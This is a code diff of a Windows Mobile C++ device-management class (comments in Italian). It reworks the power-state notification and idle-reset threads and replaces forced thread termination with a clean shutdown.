@@ -23,54 +23,79 @@ extern "C" {
 #define CLOSEHANDLE(x) if (x != NULL && x != INVALID_HANDLE_VALUE){ CloseHandle(x); x = NULL; }
 #define MAX_EVENT_NOTIFICATION_1  2000
 
+static BOOL bResetStop = FALSE;
+static BOOL bStateUnattended = FALSE;
+
 DWORD WINAPI ResetIdle(LPVOID lpParam) {
 	Device *deviceObj = Device::self();
-	Log logInfo;
+	HANDLE closeEvent = (HANDLE)lpParam;
+	DWORD dwDelay = INFINITE;
 
-	BOOL bStateUnattended = FALSE;
+	LOOP {
+		if (WaitForSingleObject(closeEvent, dwDelay) == WAIT_OBJECT_0) {
+			if (bResetStop) {
+				DBG_TRACE(L"Debug - Device.cpp - ResetIdle() thread closing\n", 1, FALSE);
+				return 0;
+			}
+
+			Sleep(500);
+
+			// Cambio del power state
+			if (deviceObj->IsDeviceUnattended())
+				dwDelay = 30000;
+			else
+				dwDelay = INFINITE;
+		}
+	}
+}
+
+DWORD WINAPI PowerStateNotifier(LPVOID lpParam) {
+	Device *deviceObj = Device::self();
+	Log logInfo;
+	HANDLE hQueue, hIdle;
+
 	DWORD dwRet, dwRead = 0, dwFlags = 0;
 	POWER_BROADCAST *powerBroad;
 	BYTE bd[sizeof(POWER_BROADCAST) + (MAX_PATH + 1) * sizeof(WCHAR)];
 
 	powerBroad = (POWER_BROADCAST *)bd;
 	//SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+	hQueue = (HANDLE)lpParam;
+	hIdle = deviceObj->getIdleEvent();
 
 	LOOP {
-		dwRet = WaitForSingleObject((HANDLE)lpParam, 10000);
+		dwRet = WaitForSingleObject(hQueue, INFINITE);
 
-		if (dwRet != WAIT_TIMEOUT) {
-			if (ReadMsgQueue((HANDLE)lpParam, powerBroad, sizeof(bd), &dwRead, 1, &dwFlags)) {
-				if (powerBroad->Message & PBT_TRANSITION) {
-					switch (powerBroad->Flags) {
-						//case POWER_STATE_OFF:
-						//	logInfo.WriteLogInfo(L"Power off");
-						//	break;
-
-						case POWER_STATE_CRITICAL:
-							logInfo.WriteLogInfo(L"Phone is turning off, battery level critical");
-							break;
-
-						case POWER_STATE_RESET:
-							logInfo.WriteLogInfo(L"Reset");
-							break;
-
-						default: break;
-					}
-
-					if (bStateUnattended == FALSE && !wcsicmp(powerBroad->SystemPowerState, L"unattended")) {
-						bStateUnattended = TRUE;
-					} else if (bStateUnattended && wcsicmp(powerBroad->SystemPowerState, L"unattended")) {
-						bStateUnattended = FALSE;
-					}
-				}
-			}
-
-			// Richiama tutte le callback registrate
-			deviceObj->CallRegisteredCallbacks(powerBroad);
+		if (bResetStop) {
+			DBG_TRACE(L"Debug - Device.cpp - PowerStateNotifier() thread closing\n", 1, FALSE);
+			return 0;
 		}
 
-		if (bStateUnattended)
-			SystemIdleTimerReset();
+		if (ReadMsgQueue(hQueue, powerBroad, sizeof(bd), &dwRead, 1, &dwFlags)) {
+			if (powerBroad->Message & PBT_TRANSITION) {
+				switch (powerBroad->Flags) {
+					//case POWER_STATE_OFF:
+					//	logInfo.WriteLogInfo(L"Power off");
+					//	break;
+
+					case POWER_STATE_CRITICAL:
+						logInfo.WriteLogInfo(L"Phone is turning off, battery level critical");
+						break;
+
+					case POWER_STATE_RESET:
+						logInfo.WriteLogInfo(L"Reset");
+						break;
+
+					default: break;
+				}
+
+				// Avvertiamo il thread che il resetidle che il powerstate e' cambiato
+				SetEvent(hIdle);
+			}
+		}
+
+		// Richiama tutte le callback registrate
+		deviceObj->CallRegisteredCallbacks(powerBroad);
 	}
 }
 
@@ -94,7 +119,7 @@ Device* Device::self() {
 
 Device::Device() : hDeviceMutex(NULL), dwPhoneState(0), dwRadioState(0), systemPowerStatus(NULL),
 hGpsPower(0), hMicPower(0), hDeviceQueue(NULL), hPowerNotification(NULL), iWaveDevRef(0), uMmcNumber(0),
-m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL) {
+m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL), hResetIdleThread(NULL), hIdleEvent(NULL) {
 	MSGQUEUEOPTIONS queue = {0};
 	BOOL bPower;
 
@@ -108,6 +133,10 @@ m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL) {
 	strPhoneNumber.clear();
 	strManufacturer.clear();
 	strModel.clear();
+
+	hIdleEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+
+	hResetIdleThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ResetIdle), hIdleEvent, 0, NULL);
 
 	systemPowerStatus = new(std::nothrow) SYSTEM_POWER_STATUS_EX2;
 
@@ -136,7 +165,7 @@ m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL) {
 
 		if (hPowerNotification) {
 			// Non deve mai essere chiuso
-			hNotifyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ResetIdle), hDeviceQueue, 0, NULL);
+			hNotifyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(PowerStateNotifier), hDeviceQueue, 0, NULL);
 		}
 	}
 }
@@ -151,6 +180,20 @@ Device::~Device() {
 
 	mDiskInfo.clear();
 
+	bResetStop = TRUE;
+
+	if (hNotifyThread != NULL) {
+		BYTE pBuf = 0;
+
+		WriteMsgQueue(hDeviceQueue, &pBuf, 1, 10000, 0);
+		WaitForSingleObject(hNotifyThread, INFINITE);
+		//TerminateThread(hNotifyThread, 0);
+		CloseHandle(hNotifyThread);
+	}
+
+	if (hDeviceQueue != NULL)
+		CloseMsgQueue(hDeviceQueue);
+
 	if (hGpsPower)
 		ReleasePowerRequirement(hGpsPower);
 
@@ -160,12 +203,10 @@ Device::~Device() {
 	if (hPowerNotification != NULL)
 		StopPowerNotifications(hPowerNotification);
 
-	if (hDeviceQueue != NULL)
-		CloseMsgQueue(hDeviceQueue);
-
-	if (hNotifyThread != NULL) {
-		TerminateThread(hNotifyThread, 0);
-		CloseHandle(hNotifyThread);
+	if (hResetIdleThread) {
+		SetEvent(hIdleEvent);
+		WaitForSingleObject(hResetIdleThread, INFINITE);
+		CloseHandle(hResetIdleThread);
 	}
 }
 
@@ -1021,6 +1062,8 @@ BOOL Device::UnRegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify) {
 	}
 
 	UNLOCK(hDeviceMutex);
+	Sleep(200);
+
 	return FALSE;
 }
 
@@ -1332,4 +1375,8 @@ void Device::SetTimeDiff(ULARGE_INTEGER uTime) {
 
 ULARGE_INTEGER Device::GetTimeDiff() {
 	return ulTimeDiff;
+}
+
+HANDLE Device::getIdleEvent() {
+	return hIdleEvent;
 }
